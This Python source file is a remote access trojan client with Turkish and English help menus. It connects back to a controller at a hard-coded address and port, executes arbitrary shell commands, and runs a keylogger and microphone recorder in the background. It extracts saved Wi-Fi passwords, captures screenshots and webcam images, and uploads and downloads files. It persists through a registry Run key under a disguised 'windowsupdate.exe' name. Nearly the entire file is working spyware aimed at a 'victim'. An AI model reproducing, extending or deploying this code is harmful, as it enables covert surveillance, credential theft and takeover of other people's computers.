import subprocess
import os
import simplejson
import base64
import socket
import kg
import time
import threading
import pyttsx3
from PIL import ImageGrab
import sys
import shutil
import cv2
import ses_kayit


class mySocket():
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))
        self.kg_dosya = os.environ["appdata"]+"\\windowslogs.txt"
        self.tro_dosya = os.environ["appdata"]+"\\windowsupdate.exe"
        self.ss_dosya = os.environ["appdata"]+"\\update.png"
        self.kamera_dosya = os.environ["appdata"]+"\\windowsupdate.png"
        self.ses_dosya = os.environ["appdata"]+"\\windowssounds.wav"
        mythread = threading.Thread(target=self.kgB)
        mythread.start()
        mythread2 = threading.Thread(target=self.seskaydet)
        mythread2.start()


    def komutCalistir(self,komut):
        komut_cikisi = subprocess.check_output(komut,shell=True)
        return komut_cikisi.decode("Latin1")


    def jsonGonder(self,data):
        json_data = simplejson.dumps(data)
        self.connection.send(json_data.encode("utf-8"))


    def jsonAl(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1048576).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue


    def get_file_contents(self, yol):
        with open(yol, "rb") as dosya:
            return base64.b64encode(dosya.read())


    def save_file(self, yol, icerik):
        with open(yol, "wb") as dosya:
            dosya.write(base64.b64decode(icerik))
            return "[+]Dosya karsi cihaza yuklendi./The file was uploaded on victim's computer."


    def cdCalistir(self, yol):
        os.chdir(yol)
        return "[+]Klasore gecildi/Changed directory : " + yol

    def klasorOlustur(self, dosya_adi):
        os.mkdir(dosya_adi)
        return "[+]Klasor olusturuldu/Directory was created : " + dosya_adi

    def klasorSil(self, dosya_adi):
        os.rmdir(dosya_adi)
        return "[+]Klasor silindi/Directory was removed : " + dosya_adi

    def dosyaSil(self, ad):
        os.remove(ad)
        return "[+]Silindi/Removed : " + ad

    def isimDegistir(self, ad1, ad2):
        os.rename(ad1, ad2)
        return "[+]Isim degistirildi./Name was changed.\n" + ad1 + "→→→→→→" + ad2

    def dosyaAc(self, dosya_adi):
        os.system(dosya_adi)
        return "[+]Dosya karsi bilgisayarda acildi/The file was opened on victim's computer. : " + dosya_adi

    def Pwd(self):
        return os.getcwd()

    def yardim(self):
        return """
        K...l.o.gger aktif durumda.Arka planda çaışıyor.Aynı zamanda kurban cihazın mikrofonu da kaydediliyor.Aşağıdaki komutlar haricinde yazdıklarınız normal olarak kurban cihazin terminalinde calisacaktir.
        İslevsel komutlar : \n\n\n
        cik →→→→→→→→→→→→→→→→→→ Baglantiyi keser ve cikar.
        temizle →→→→→→→→→→→→→→ Ekrani temizler.
        sistem →→→→→→→→→→→→→→→ Kurban cihazin kullandigi sistem türünü gösterir.
        konus →→→→→→→→→→→→→→→→ Yanina yazdiginiz kelimeler kurban cihazda robotik olarak soylenir.Kullanim 'konus <kelimeler>'
        wifiler →→→→→→→→→→→→→→ Kurban cihazin önceden bağlanmış olduğu ve şuanda bağlandığı ağların adı ve şifrelerini gösterir.
        ekran_goruntusu →→→→→→ Kurban cihazın ekran görüntüsünü alır ve kaydeder.
        kalicilik →→→→→→→→→→→→ T...an'ı appdata klasörüne gizleyip regedit ile kurban cihaz her bilgisayarını başlattığında T...an aktif olacaktir.
        kalicilik_kaldir →→→→→ Kaliciligi kaldirir.
        yardim →→→→→→→→→→→→→→→ Bu menüyü gösterir.
        
        Dosya komutlari : \n\n\n
        cd →→→→→→→→→→→→→→→→→→→ Dizin degistirir.Kullanim : 'cd <dizin adi>'
        pwd →→→→→→→→→→→→→→→→→→ Bulundugunuz dizini gosterir.
        mkdir →→→→→→→→→→→→→→→→ Bulundugu dizinde klasor olusturur.Kullanim : 'mkdir <dosya adi>'
        rmdir →→→→→→→→→→→→→→→→ Bulundugu dizindeki klasoru siler.Kullanim : 'rmdir <dosya adi>'
        sil →→→→→→→→→→→→→→→→→→ Bulundugu dizindeki dosyayi siler.(klasoru degil.)Kullanim : 'rm <dosya adi>'
        rename →→→→→→→→→→→→→→→ Bulundugu dizindeki dosyanin/klasorun ismini veya uzantisini degistirir.Kullanim : 'rename <kaynak adi> <cikis adi>' Ornek:rename test.txt yenitest.txt
        ac  →→→→→→→→→→→→→→→→→→ Bulundugu dizindeki dosyayi kurban bilgisayarda acar.Kullanim : 'open <dosya adi>'
        indir →→→→→→→→→→→→→→→→ Kurban bilgisayardan kendi bilgisayariniza dosya/klasor indirir.Kullanim : 'download <dosya/klasor adi>'
        yukle →→→→→→→→→→→→→→→→ Kurban bilgisayara dosya/klasor yukler.Kullanim : 'upload <dosya_adi>'
        
        K...og..r komutlari : \n\n\n
        kg_oku →→→→→→→→→→→→→→→→ Kurban cihazin bastigi tuslari terminale yazar.
        kg_kaydet →→→→→→→→→→→→→ Kurban cihazin bastigi tuslarin toplandigi dosyayi(log.txt) bilgisayarınıza indirir.
        
        Kamera ve ses komutlari : \n\n\n
        kamera_goruntusu_al →→→ Kurban cihazin kamerasindan bir görüntü alır ve kaydeder.
        ses_kayit_indir →→→→→→→ Kurban t...an'ı açtığından beri olan ses kaydını indirir.(Eğer uzun süre ise indirme işlemi uzun sürebilir.)(Komutu kullandıktan sonra bu sefer komutu ilk kullandığınızdan sonraki kullanımınıza kadar kaydeder.)
        """

    def help(self):
        return """
        K..l..ger is active now.It is working in background.At the same time,recording the victim's microphone.Except for the commands below, what you type will normally work in the terminal of the victim device.
        Functional commands : \n\n\n
        exit →→→→→→→→→→→→→→→→→→→ Disconnected and exiting program.
        clear →→→→→→→→→→→→→→→→→→ Cleans up the terminal.
        system →→→→→→→→→→→→→→→→→ Shows the victim's computer's system type.
        talk →→→→→→→→→→→→→→→→→→→ The words you type next to them are said robotically on the victim device.Usage : 'talk <words>'
        wifis →→→→→→→→→→→→→→→→→→ Shows wifi names and passwords victim's previously connected.
        ss →→→→→→→→→→→→→→→→→→→→→ Takes a screenshot and saves to your pc.
        permanance →→→→→→→→→→→→→ Hides tr..an to appdata folder and adds to regedit.So, the tr..an will automaticly start in every bootup.
        remove_permanance →→→→→→ Removes the permanance.
        help →→→→→→→→→→→→→→→→→→→ Shows this message.
        
        Directory/file commands : \n\n\n
        cd →→→→→→→→→→→→→→→→→→→→→ Changes directory.Usage : 'cd <directory_name>'
        pwd →→→→→→→→→→→→→→→→→→→→ Shows the directory you are in.
        mkdir →→→→→→→→→→→→→→→→→→ Creates a directory.Usage : 'mkdir <name>'
        rmdir →→→→→→→→→→→→→→→→→→ Removes a directory.Usage : 'rmdir <name_to_be_deleted>'
        rm →→→→→→→→→→→→→→→→→→→→→ Removes a file.Usage : 'rm <file_name_to_be_deleted>'
        open →→→→→→→→→→→→→→→→→→→ Opens a file on victim's pc.Usage : 'open <file_name_to_be_opened>'
        download →→→→→→→→→→→→→→→ Downloads a file from victim's pc.Usage : 'download <file_name_to_be_downloaded>'
        upload →→→→→→→→→→→→→→→→→ Uploads a file from your pc.Usage : 'upload <file_name_to_be_uploaded>'
        
        K...og.r commands : \n\n\n
        kg_read →→→→→→→→→→→→→→→→ Writes the pressed keys of victim on terminal.
        kg_save →→→→→→→→→→→→→→→→ Downloads the pressed keys of victim(log.txt).
        
        Camera and sounds commands : \n\n\n
        get_camera_image →→→→→→→ Takes a picture from victim's camera and saves it current directory on your pc.
        download_sound_recording → It downloads the audio recording since the victim opened t...an. (If it is a long time, the download may take longer.) (After using the command, this time it will save the command from the first time you use it until the next use.)
        """


    def check(self):
        if os.name == 'nt':
            return "Kurban cihaz bir windows sürümü./Victim is a windows."
        elif os.name == 'posix':
            return "Kurban cihaz bir linux sürümü./Victim is a linux distribution"

    def kgB(self):
        kg.kgBasla()

    def kgOku(self):
        with open(self.kg_dosya, "r",encoding="utf-8") as file:
            return file.read()

    def konus(self,kelimeler):
        engine = pyttsx3.init()
        engine.setProperty("rate", 120)
        engine.say(kelimeler)
        engine.runAndWait()
        return "[+]Kurban cihazda ses calindi./The sound was played on victim's computer."

    def GizleveKaliciyap(self):
        regedit_komut = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v windowsupdate /t REG_SZ /d " + self.tro_dosya
        if not os.path.exists(self.tro_dosya):
            shutil.copyfile(sys.executable,self.tro_dosya)
            subprocess.call(regedit_komut,shell=True)
        return "[+]Zararlı yazılımımız appdata klasörüne gizlendi ve artık kurban her bilgisayarini açtığında arkaplanda çalışacak./Permanance activated and it will work every time the victim boots up his computer."

    def gizlemeyiKaldir(self):
        os.remove(self.tro_dosya)
        return "[+]Zararlı yazılımımız appdata klasöründe kaldırıldı ve kurban bilgisayarını her açtığında çalışmayacak./Permanance removed and it will not work every time the victim boots up his computer."

    def seskaydet(self):
        self.basla = ses_kayit.Kayit()
        self.basla.startRecord()


    def Basla(self):
        while True:
            komut = self.jsonAl()
            try:
                if komut[0] == "exit" or komut[0] == "cik":
                    self.connection.close()
                    exit()
                elif komut[0] == "cd" and len(komut) > 1:
                    komut_cikisi = self.cdCalistir(komut[1])
                elif komut[0] == "download" or komut[0] == "indir":
                    komut_cikisi = self.get_file_contents(komut[1])
                elif komut[0] == "upload" or komut[0] == "yukle":
                    komut_cikisi = self.save_file(komut[1], komut[2])
                elif komut[0] == "mkdir":
                    komut_cikisi = self.klasorOlustur(komut[1])
                elif komut[0] == "rmdir":
                    komut_cikisi = self.klasorSil(komut[1])
                elif komut[0] == "rm" or komut[0] == "sil":
                    komut_cikisi = self.dosyaSil(komut[1])
                elif komut[0] == "rename":
                    komut_cikisi = self.isimDegistir(komut[1], komut[2])
                elif komut[0] == "open" or komut[0] == "ac":
                    komut_cikisi = self.dosyaAc(komut[1])
                elif komut[0] == "pwd":
                    komut_cikisi = self.Pwd()
                elif komut[0] == "sistem" or komut[0] == "system":
                    komut_cikisi = self.check()
                elif komut[0] == "kg_oku" or komut[0] == "kg_read":
                    komut_cikisi = self.kgOku()
                elif komut[0] == "konus" or komut[0] == "talk":
                    komut_cikisi = self.konus(komut[1:])
                elif komut[0] == "wifiler" or komut[0] == "wifis":
                    wifiler = subprocess.check_output(["netsh", "wlan", "show", "profiles"]).decode()
                    wifi = wifiler.split("\n")
                    profiles = [i.split(":")[1][1:-1] for i in wifi if "All User Profile" in i]
                    profile_str = " ".join(profiles)
                    komut_cikisi = "Wifi aglari/Wifi Networks : \n\n\n"
                    komut_cikisi +=profile_str + "\n\n\n"
                    komut_cikisi += "Wifi sifreleri(sirasiyla)/Wifi passwords(in order of) :\n\n"
                    for i in profiles:
                        try:
                            sonuc = subprocess.check_output(["netsh", "wlan", "show", "profile", i, "key=clear"]).decode("utf-8").split("\n")
                            sonuc = [b.split(":")[1][1:-1] for b in sonuc if "Key Content" in b]
                            sonuc_str = " ".join(sonuc)
                            if sonuc_str == "":
                                sonuc_str = "Sifresiz/None"

                            komut_cikisi += "\t" + sonuc_str
                        except subprocess.CalledProcessError:
                            print("Hata.")

                elif komut[0] == "ss" or komut[0] == "ekran_goruntusu":
                    ImageGrab.grab().save(self.ss_dosya)
                    komut_cikisi=self.get_file_contents(self.ss_dosya)
                    os.remove(self.ss_dosya)
                elif komut[0] == "kg_kaydet" or komut[0] == "kg_save":
                    komut_cikisi = self.get_file_contents(self.kg_dosya)
                    os.remove(self.kg_dosya)

                elif komut[0] == "kalicilik" or komut[0] == "permanance":
                    komut_cikisi = self.GizleveKaliciyap()
                elif komut[0] == "kalicilik_kaldir" or komut[0] == "remove_permanance":
                    komut_cikisi = self.gizlemeyiKaldir()
                elif komut[0] == "kamera_goruntusu_al" or komut[0] == "get_camera_image":
                    kamera = cv2.VideoCapture(0)
                    sonuc, goruntu = kamera.read()
                    if sonuc:
                        cv2.imwrite(self.kamera_dosya,goruntu)
                        komut_cikisi = self.get_file_contents(self.kamera_dosya)
                        os.remove(self.kamera_dosya)
                    else:
                        komut_cikisi = "[-]Kameraya erisilemiyor./Can not reach the camera."

                elif komut[0] == "ses_kayit_indir" or komut[0] == "download_sound_recording":
                    self.basla.stopRecord()
                    komut_cikisi = self.get_file_contents(self.ses_dosya)
                    os.remove(self.ses_dosya)

                elif komut[0] == "yardim":
                    komut_cikisi = self.yardim()
                elif komut[0] == "help":
                    komut_cikisi = self.help()
                else:
                    komut_cikisi = self.komutCalistir(komut)
            except Exception:
                komut_cikisi = "Bilinmeyen bir komut.Komut listesi icin 'yardim' komutunu kullaniniz./Unknown command.For command list use 'help' command."

            self.jsonGonder(komut_cikisi)
        self.connection.close()



def baglanti_dene():
    while True:
        time.sleep(5)
        try:
            soket = mySocket("192.168.1.105",4444)
            soket.Basla()
        except Exception:
            baglanti_dene()

baglanti_dene()